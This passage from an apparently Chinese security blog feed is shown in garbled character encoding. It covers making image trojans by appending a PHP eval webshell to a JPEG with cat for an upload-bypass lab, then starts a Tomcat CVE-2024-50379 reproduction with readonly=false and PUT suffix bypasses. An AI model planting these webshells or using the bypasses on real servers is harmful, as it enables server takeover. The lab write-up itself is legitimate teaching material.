å›¾ç‰‡æœ¨é©¬</h2><p>ä»¥gifä¸ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">47</span> <span class="token number">49</span> <span class="token number">46</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">61</span> F1 00 2C 01 F7 00 00 <span class="token number">64</span> <span class="token number">32</span> <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨yakitçš„gifæ–‡ä»¶å¤´æ ‡ç­¾å¯ä»¥å¿«é€Ÿæ— ç—›ç”Ÿæˆå›¾ç‰‡æœ¨é©¬ã€‚å…¶ä»–æ–‡ä»¶å¤´å¯ä»¥å‚è€ƒæœ¬ç«™ã€ŠYakitå•å…µå®‰å…¨èƒ½åŠ›å¹³å° ã€‹ä¸€æ–‡çš„â€œæ ‡ç­¾ä½¿ç”¨ç»éªŒç§¯ç´¯â€ç« èŠ‚ã€‚</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2017.20.46.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-23%2017.20.04.png" style="zoom:50%;"><p>æˆåŠŸgetshellï¼Œéå¸¸ä¸æ»‘ã€‚</p><h2 id="2-4-catå‘½ä»¤åˆ¶ä½œå›¾ç‰‡æœ¨é©¬"><a href="#2-4-catå‘½ä»¤åˆ¶ä½œå›¾ç‰‡æœ¨é©¬" class="headerlink" title="2.4 catå‘½ä»¤åˆ¶ä½œå›¾ç‰‡æœ¨é©¬"></a>2.4 catå‘½ä»¤åˆ¶ä½œå›¾ç‰‡æœ¨é©¬</h2><p>buuoj-(Upload-Labs-Linux)-Pass14ä¸ºä¾‹ï¼š</p><ul><li>ä½¿ç”¨cat å‘½ä»¤åˆ¶ä½œå›¾ç‰‡æœ¨é©¬</li></ul><p>å¯èƒ½ç”±äºgetiamgesizeå¯¹å›¾ç‰‡æ£€æµ‹æ¯”è¾ƒå…¨é¢ã€‚æˆ‘ä»¬å…ˆä¸‹è½½ä¸€å¼ åŸå§‹çš„jpegå›¾åƒï¼Œæ”¾ä¸‹é¢äº†ï¼ˆæ¯”å¦‚å‘½åä¸ºimg.jpegï¼‰ï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E5%8E%9F%E5%A7%8Bjpeg%E5%9B%BE%E7%89%87.jpeg" alt="åŸå§‹jpegå›¾ç‰‡" style="zoom:67%;"><p>å‡†å¤‡å¥½yjh.php</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä½¿ç”¨catå‘½ä»¤åˆå¹¶æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> yjh.php <span class="token operator">&gt;&gt;</span> img.jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå¯ä»¥ç”¨010editoræ‰“å¼€çœ‹ä¸‹ï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-24%2010.15.16.png" style="zoom:50%;"><p>å›¾ç‰‡å°¾éƒ¨å·²ç»è¢«æ·»åŠ ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æœ¨é©¬æ–‡ä»¶å¦‚ä¸‹ï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC.jpeg" alt="å›¾ç‰‡æœ¨é©¬" style="zoom:50%;"><p>ä¸Šä¼ getshellï¼š</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-24%2010.17.51.png" style="zoom:50%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-24%2010.10.27.png" style="zoom:40%;"><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2025-01-24%2010.18.24.png" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> å›¾ç‰‡æœ¨é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache-Tomcatæ¡ä»¶ç«äº‰è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2024-50379)</title>
      <link href="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/"/>
      <url>/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€-CVE-2024-50379-æ¼æ´æ¦‚è¿°"><a href="#ä¸€ã€-CVE-2024-50379-æ¼æ´æ¦‚è¿°" class="headerlink" title="ä¸€ã€(CVE-2024-50379)æ¼æ´æ¦‚è¿°"></a>ä¸€ã€(CVE-2024-50379)æ¼æ´æ¦‚è¿°</h1><h2 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h2><p>Apache Tomcatæ¡ä»¶ç«äº‰è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2024-50379ï¼‰æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ç»•è¿‡Tomcatçš„å¤§å°å†™æ£€æŸ¥ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶å¹¶æ‰§è¡Œè¿œç¨‹ä»£ç ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶ã€‚</p><h2 id="1-2-åŸç†æ¦‚è¿°"><a href="#1-2-åŸç†æ¦‚è¿°" class="headerlink" title="1.2 åŸç†æ¦‚è¿°"></a>1.2 åŸç†æ¦‚è¿°</h2><p>è¯¥æ¼æ´æ˜¯ç”±äºTomcatåœ¨éªŒè¯æ–‡ä»¶è·¯å¾„æ—¶å­˜åœ¨ç¼ºé™·ï¼Œå¦‚æœ<code>readonly</code>å‚æ•°è¢«è®¾ç½®ä¸º<code>false</code>ï¼ˆè¿™æ˜¯ä¸€ä¸ªéæ ‡å‡†é…ç½®ï¼‰ï¼Œå¹¶ä¸”æœåŠ¡å™¨å…è®¸é€šè¿‡PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥ä¸Šä¼ å«æœ‰æ¶æ„JSPä»£ç çš„æ–‡ä»¶ã€‚é€šè¿‡ä¸æ–­åœ°å‘é€è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œä½¿å¾—Tomcatè§£æå¹¶æ‰§è¡Œè¿™äº›æ¶æ„æ–‡ä»¶ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="1-3-å½±å“èŒƒå›´"><a href="#1-3-å½±å“èŒƒå›´" class="headerlink" title="1.3 å½±å“èŒƒå›´"></a>1.3 å½±å“èŒƒå›´</h2><ul><li>å—å½±å“çš„Apache Tomcatç‰ˆæœ¬åŒ…æ‹¬ï¼š<ul><li>11.0.0-M1 &lt;= Apache Tomcat &lt; 11.0.2</li><li>10.1.0-M1 &lt;= Apache Tomcat &lt; 10.1.34</li><li>9.0.0.M1 &lt;= Apache Tomcat &lt; 9.0.98</li></ul></li><li>è¯¥æ¼æ´ä»…å½±å“åœ¨Windowsç³»ç»Ÿä¸‹å¯ç”¨PUTè¯·æ±‚æ–¹æ³•ï¼Œå¹¶å°†<code>readonly</code>å‚æ•°è®¾ç½®ä¸ºéé»˜è®¤å€¼<code>false</code>çš„æƒ…å†µã€‚</li></ul><h2 id="1-4-å›é¡¾CVE-2017-12615"><a href="#1-4-å›é¡¾CVE-2017-12615" class="headerlink" title="1.4 å›é¡¾CVE-2017-12615"></a>1.4 å›é¡¾<strong>CVE-2017-12615</strong></h2><p>CVE-2024-50379å’ŒCVE-2017-12615å­˜åœ¨å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ã€‚</p><p>CVE-2017-12615æ˜¯ä¸€ä¸ªå½±å“Apache TomcatæœåŠ¡å™¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><ul><li><p>å½“Apache Tomcatè¿è¡Œåœ¨Windowsæ“ä½œç³»ç»Ÿä¸Šï¼Œå¹¶ä¸”å¯ç”¨äº†HTTP PUTè¯·æ±‚æ–¹æ³•æ—¶ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å°†<code>readonly</code>åˆå§‹åŒ–å‚æ•°çš„é»˜è®¤å€¼è®¾ç½®ä¸º<code>false</code>ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„JSPæ–‡ä»¶ã€‚è¿™äº›JSPæ–‡ä»¶ä¸­çš„ä»£ç èƒ½å¤Ÿè¢«æœåŠ¡å™¨æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p></li><li><p>å—å½±å“çš„Apache Tomcatç‰ˆæœ¬åŒ…æ‹¬7.0.0è‡³7.0.81ã€‚</p></li><li><p>è¯¥æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯å› ä¸ºé…ç½®ä¸å½“ï¼ˆéé»˜è®¤é…ç½®ï¼‰ï¼Œå…·ä½“æ¥è¯´ï¼Œæ˜¯å°†é…ç½®æ–‡ä»¶<code>conf/web.xml</code>ä¸­çš„<code>readonly</code>è®¾ç½®ä¸ºäº†<code>false</code>ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨PUTæ–¹æ³•ä¸Šä¼ ä»»æ„æ–‡ä»¶ã€‚å°½ç®¡å¯¹JSPåç¼€æœ‰é™åˆ¶ï¼Œä½†å¯¹äºä¸åŒå¹³å°å­˜åœ¨å¤šç§ç»•è¿‡æ–¹æ³•ã€‚</p></li><li><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€HTTP PUTè¯·æ±‚ï¼Œå¹¶åœ¨è¯·æ±‚ä¸­åŒ…å«æ¶æ„JSPä»£ç ï¼Œæ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨.jspååŠ å…¥<code>/</code>æˆ–è€…å…¶ä»–æ–¹å¼æ¥ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶ã€‚</p></li></ul><p>æ¯”å¦‚å­˜åœ¨å¦‚ä¸‹çš„web.xmlçš„é…ç½®ï¼Œå½“è¯·æ±‚çš„åç¼€ä¸ºjspæˆ–jspxçš„æ—¶å€™äº¤ç”±JSP servletè¿›è¡Œå¤„ç†è¯·æ±‚ï¼Œæ­¤å¤–äº¤ç»™default servletè¿›è¡Œå¤„ç†è¯·æ±‚ã€‚ä½†æ˜¯å½“PUTä¸€ä¸ª1.jsp/ã€1.jspç©ºæ ¼ã€1.jsp%00ä»è€Œç»•è¿‡JSP servletçš„é™åˆ¶ï¼Œè®©default servletæ¥å¤„ç†è¯·æ±‚ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- The mapping for the default servlet --&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- The mappings for the JSP servlet --&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>*.jspx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span>       <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token function">sendNotAllowed</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">return</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå½“readOnlyè®¾ç½®ä¸ºtrueçš„æ—¶å€™ï¼ˆä¹Ÿå°±æ˜¯å…³é—­PUTæ–¹æ³•ï¼‰ä¼šç›´æ¥è¿”å›ï¼›ä½†æ˜¯å¦‚æœè®¾ç½®ä¸ºäº†falseï¼Œå¯ä»¥é€šè¿‡ä¸€äº›æªæ–½ç»•è¿‡åç¼€åçš„æ£€æµ‹æ¥ä¸Šä¼ webshellã€‚</p><p>CVE-2024-50379ä¹Ÿä¼šåˆ©ç”¨åˆ°readOnly=falseçš„æ¡ä»¶ï¼Œè¿™æ—¶é€šè¿‡putä¸Šä¼ 1.Jspçš„æ¶æ„ä»£ç ï¼ˆJspçš„Jå¤§å†™æ˜¯ä¸ºäº†ç»•è¿‡åç¼€åçš„æ£€æµ‹ï¼‰åˆ°æœåŠ¡å™¨ã€‚</p><p>é€šè¿‡å¹¶å‘putæ–‡ä»¶ä¸Šä¼ éæ ‡å‡†åç¼€çš„â€jspâ€ï¼Œå¹¶ä¸æ–­å‘èµ·getè¯·æ±‚ä¸€ä¸ªæ ‡å‡†åæœ€çš„â€jspâ€æ–‡ä»¶ï¼Œæœ€ç»ˆç”±äºæœåŠ¡å™¨çš„å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¯¼è‡´è¯·æ±‚æˆåŠŸé€ æˆRCEã€‚</p><h1 id="äºŒã€æ¼æ´å¤ç°"><a href="#äºŒã€æ¼æ´å¤ç°" class="headerlink" title="äºŒã€æ¼æ´å¤ç°"></a>äºŒã€æ¼æ´å¤ç°</h1><h2 id="2-1-ç¯å¢ƒæ­å»º"><a href="#2-1-ç¯å¢ƒæ­å»º" class="headerlink" title="2.1 ç¯å¢ƒæ­å»º"></a>2.1 ç¯å¢ƒæ­å»º</h2><h3 id="2-1-1-ç¯å¢ƒæ¡ä»¶"><a href="#2-1-1-ç¯å¢ƒæ¡ä»¶" class="headerlink" title="2.1.1 ç¯å¢ƒæ¡ä»¶"></a>2.1.1 ç¯å¢ƒæ¡ä»¶</h3><ul><li>jre1.8.0_202 ã€å¯ä»¥è”ç³»ç¬”è€…ç§å‘ã€‘</li><li>apache-tomcat-9.0.63 ã€<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.63/%E3%80%91">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.63/ã€‘</a></li><li>win7 è™šæ‹Ÿæœº</li></ul><h3 id="2-1-2-windowsè™šæ‹Ÿæœºé…ç½®ç¯å¢ƒå˜é‡"><a href="#2-1-2-windowsè™šæ‹Ÿæœºé…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="2.1.2 windowsè™šæ‹Ÿæœºé…ç½®ç¯å¢ƒå˜é‡"></a>2.1.2 windowsè™šæ‹Ÿæœºé…ç½®ç¯å¢ƒå˜é‡</h3><p>é…ç½®JAVA_HOMEï¼š</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.40.14.png" style="zoom:80%;"><p>åœ¨Pathä¸­å°†è¿™ä¸ªç‰ˆæœ¬çš„javaçš„ç¯å¢ƒå˜é‡ç½®é¡¶ï¼Œé˜²æ­¢å…¶ä»–ç‰ˆæœ¬çš„å¹²æ‰°ï¼š</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.16.04.png" style="zoom:70%;"><p>é…ç½®CATALINA_BASEï¼š</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.43.43.png" style="zoom:70%;"><blockquote><p><code>CATALINA_BASE</code>ç¯å¢ƒå˜é‡åœ¨Apache Tomcatä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ï¼Œå…¶ä¸»è¦ä½œç”¨å’Œé…ç½®å¦‚ä¸‹ï¼š</p><ol><li><strong>å®šä¹‰å’Œä½œç”¨</strong>ï¼š<ul><li><code>CATALINA_BASE</code>ç¯å¢ƒå˜é‡å®šä¹‰äº†Tomcatçš„å·¥ä½œç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ˜¯Tomcatéƒ¨ç½²åº”ç”¨ç¨‹åºçš„åŸºç¡€è·¯å¾„ã€‚å®ƒé€šå¸¸ç”¨äºéš”ç¦»ä¸åŒåº”ç”¨ç¨‹åºçš„é…ç½®å’Œèµ„æºï¼Œå…è®¸å¤šä¸ªTomcatå®ä¾‹å…±äº«åŒä¸€ä¸ª<code>CATALINA_HOME</code>ï¼Œä½†æ‹¥æœ‰ç‹¬ç«‹çš„å·¥ä½œç›®å½•ã€‚è¿™å¯¹äºå¤šç§Ÿæˆ·ç¯å¢ƒéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥é˜²æ­¢åº”ç”¨ç¨‹åºä¹‹é—´çš„èµ„æºå†²çªã€‚</li></ul></li><li><strong>ä¸CATALINA_HOMEçš„åŒºåˆ«</strong>ï¼š<ul><li><code>CATALINA_HOME</code>æ˜¯Tomcatçš„å®‰è£…ç›®å½•ï¼ŒåŒ…å«äº†Tomcatçš„æ‰€æœ‰æ ¸å¿ƒæ–‡ä»¶å’Œç›®å½•ã€‚è€Œ<code>CATALINA_BASE</code>æ˜¯æŒ‡Tomcatçš„åŸºæœ¬ç›®å½•ï¼ŒåŒ…æ‹¬é…ç½®æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶å’ŒWebåº”ç”¨ç¨‹åºç­‰ã€‚å¦‚æœåªè¿è¡Œä¸€ä¸ªTomcatå®ä¾‹ï¼Œè¿™ä¸¤ä¸ªå±æ€§æŒ‡å‘çš„ä½ç½®æ˜¯ç›¸åŒçš„ã€‚</li></ul></li><li><strong>é…ç½®å¤šä¸ªå®ä¾‹</strong>ï¼š<ul><li>å½“éœ€è¦åœ¨ä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œå¤šä¸ªTomcatå®ä¾‹æ—¶ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ä¸åŒçš„<code>CATALINA_BASE</code>æ¥å®ç°ã€‚æ¯ä¸ªå®ä¾‹å¯ä»¥æœ‰è‡ªå·±çš„é…ç½®æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ã€Webåº”ç”¨ç¨‹åºå’Œå·¥ä½œç›®å½•ï¼Œè€Œå…±äº«<code>CATALINA_HOME</code>ä¸­çš„å…¬å…±æ–‡ä»¶å¦‚<code>bin</code>å’Œ<code>lib</code>ç›®å½•ã€‚</li></ul></li></ol></blockquote><h3 id="2-1-3-å¯åŠ¨tomcat"><a href="#2-1-3-å¯åŠ¨tomcat" class="headerlink" title="2.1.3 å¯åŠ¨tomcat"></a>2.1.3 å¯åŠ¨tomcat</h3><p>è¿™ä¸‹ç¯å¢ƒå˜é‡å°±å·²ç»é…ç½®é½äº† è¿™ä¸ªæ—¶å€™å°±å·²ç»å¯ä»¥æ­£å¸¸å¯åŠ¨tomcatäº† è¿è¡Œè¿™ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ã€‚</p><p>C:\Users\client\Desktop\apache-tomcat-9.0.63\apache-tomcat-9.0.63\bin\startup.bat</p><p>å¯åŠ¨æˆåŠŸï¼ˆä¹±ç ï¼‰</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.17.33.png" style="zoom:50%;"><p>æ‰¾åˆ°<strong>Tomcat</strong>ç›®å½•ä¸‹<strong>conf</strong>æ–‡ä»¶å¤¹ä¸­çš„<strong>logging.properties</strong>æ–‡ä»¶ï¼Œ</p><p>æ‰“å¼€<strong>logging.properties</strong>æ–‡ä»¶ï¼Œæ‰¾åˆ°æ–‡ä»¶ä¸­çš„<strong>java.util.logging.ConsoleHandler.encoding = UTF-8ï¼Œ</strong></p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.20.32.png" style="zoom:80%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.21.52.png" style="zoom:80%;"><p>å°†å…¶ä¸­çš„<strong>UTF-8</strong>æ”¹ä¸º<strong>GBK</strong>ï¼Œä¿å­˜å<a href="https://so.csdn.net/so/search?q=%E9%87%8D%E5%90%AFTomcat&amp;spm=1001.2101.3001.7020">é‡å¯Tomcat</a>æœåŠ¡ï¼Œå¯åŠ¨åå°±ä¼šçœ‹åˆ°åˆšæ‰çš„ä¹±ç å·²ç»è½¬æ¢è¿‡æ¥äº†ã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.22.44.png" style="zoom:60%;"><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.24.46.png" style="zoom:50%;"><h2 id="2-2-æ¼æ´å¤ç°"><a href="#2-2-æ¼æ´å¤ç°" class="headerlink" title="2.2 æ¼æ´å¤ç°"></a>2.2 æ¼æ´å¤ç°</h2><p>web.xml readOnlyé…ç½®ä¸ºfalseï¼Œå³å…è®¸PUTä¸Šä¼ ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.apache.catalina.servlets.DefaultServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>listings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>putä¸Šä¼ 1.jspï¼Œæ— æ³•ä¸Šä¼ ã€‚</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.28.43.png" style="zoom:50%;"><h3 id="2-2-1-å°è¯•CVE-2017-12615ç»•è¿‡"><a href="#2-2-1-å°è¯•CVE-2017-12615ç»•è¿‡" class="headerlink" title="2.2.1 å°è¯•CVE-2017-12615ç»•è¿‡"></a>2.2.1 å°è¯•CVE-2017-12615ç»•è¿‡</h3><ul><li>/ 